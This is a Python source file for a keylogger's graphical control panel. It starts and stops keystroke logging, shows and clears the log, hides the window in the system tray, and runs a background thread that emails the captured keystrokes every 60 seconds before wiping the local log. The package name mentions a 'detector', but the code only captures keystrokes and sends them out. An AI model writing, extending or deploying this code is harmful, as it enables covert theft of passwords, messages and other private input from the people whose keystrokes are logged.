import tkinter as tk
from tkinter import scrolledtext, messagebox
from .keylogger_backend import KeyLogger
from keylogger_detector.log_mailer import send_email
import threading
import time
import pystray
from PIL import Image, ImageDraw
import os

# --- Config ---
EMAIL_INTERVAL = 60  # seconds

# --- Setup ---
keylogger = KeyLogger()

# --- Email Auto-send ---
def auto_send_email():
    while True:
        try:
            with open("log.txt", "r") as f:
                log_data = f.read()
            if log_data.strip():
                send_email(log_data)
                with open("log.txt", "w") as f:
                    f.write("")  # clear after sending
        except Exception as e:
            print("Email sending failed:", e)
        time.sleep(EMAIL_INTERVAL)

threading.Thread(target=auto_send_email, daemon=True).start()

# --- GUI Setup ---
window = tk.Tk()
window.title("Keylogger")
window.geometry("550x500")
window.configure(bg="#1e1e1e")

# --- Minimize to tray ---
def create_tray_icon():
    image = Image.new('RGB', (64, 64), color=(30, 30, 30))
    draw = ImageDraw.Draw(image)
    draw.rectangle((16, 16, 48, 48), fill=(100, 100, 255))
    icon = pystray.Icon("Keylogger", image, "Keylogger is running")

    def on_restore(icon, item):
        window.deiconify()
        icon.stop()

    icon.menu = pystray.Menu(pystray.MenuItem("Restore", on_restore))
    return icon

def minimize_to_tray():
    window.withdraw()
    icon = create_tray_icon()
    threading.Thread(target=icon.run, daemon=True).start()

# --- Functions ---
def start_logging():
    keylogger.start()
    status_label.config(text="Status: Running", fg="lightgreen")

def stop_logging():
    keylogger.stop()
    status_label.config(text="Status: Stopped", fg="red")

def show_logs():
    try:
        with open("log.txt", "r") as f:
            logs = f.read()
        log_text.delete(1.0, tk.END)
        log_text.insert(tk.END, logs)
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found.")

def clear_logs():
    open("log.txt", "w").close()
    log_text.delete(1.0, tk.END)
    messagebox.showinfo("Logs", "Logs cleared!")

def send_now():
    try:
        with open("log.txt", "r") as f:
            data = f.read()
        if data.strip():
            send_email(data)
            messagebox.showinfo("Mail", "Email sent successfully!")
        else:
            messagebox.showinfo("Mail", "No data to send.")
    except Exception as e:
        messagebox.showerror("Mail Error", str(e))

def on_closing():
    keylogger.stop()
    print("[*] Exiting cleanly...")
    window.destroy()

window.protocol("WM_DELETE_WINDOW", on_closing)
window.bind("<Escape>", lambda event: on_closing())

# --- Widgets ---
status_label = tk.Label(window, text="Status: Stopped", fg="red", bg="#1e1e1e", font=("Segoe UI", 12))
status_label.pack(pady=5)

btn_frame = tk.Frame(window, bg="#1e1e1e")
btn_frame.pack(pady=10)

tk.Button(btn_frame, text="Start Logging", command=start_logging, bg="#333", fg="white").grid(row=0, column=0, padx=10)
tk.Button(btn_frame, text="Stop Logging", command=stop_logging, bg="#333", fg="white").grid(row=0, column=1, padx=10)
tk.Button(btn_frame, text="View Logs", command=show_logs, bg="#333", fg="white").grid(row=1, column=0, pady=10)
tk.Button(btn_frame, text="Clear Logs", command=clear_logs, bg="#333", fg="white").grid(row=1, column=1, pady=10)
tk.Button(window, text="Send Mail Now", command=send_now, bg="#222", fg="white").pack(pady=5)

log_text = scrolledtext.ScrolledText(window, width=60, height=10, bg="#2d2d2d", fg="white", insertbackground="white")
log_text.pack(pady=10)

minimize_btn = tk.Button(window, text="🧊 Minimize to Tray", command=minimize_to_tray, bg="#444", fg="white")
minimize_btn.pack(pady=10)

# --- Main loop ---
try:
    window.mainloop()
except KeyboardInterrupt:
    print("[!] Program manually stopped with Ctrl+C.")
    on_closing()
